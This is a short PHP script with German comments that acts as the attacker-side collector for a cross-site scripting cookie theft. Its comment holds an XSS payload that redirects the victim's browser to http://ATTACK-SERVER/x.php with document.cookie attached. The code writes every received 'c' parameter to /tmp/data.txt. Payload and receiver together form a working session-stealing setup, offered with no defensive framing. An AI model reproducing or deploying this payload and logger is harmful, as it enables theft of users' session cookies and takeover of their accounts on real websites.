<?php

/*
Sammelt Informationen und speichert diese unter /tmp/data.txt


XSS Beispiele:
<script type="text/javascript">
document.location='http://ATTACK-SERVER/x.php?c='+document.cookie;
</script>
*/

if(!empty($_GET['c'])) {
    $logfile = fopen('/tmp/data.txt', 'a+');
    fwrite($logfile, $_GET['c']);
    fclose($logfile);
}

?>
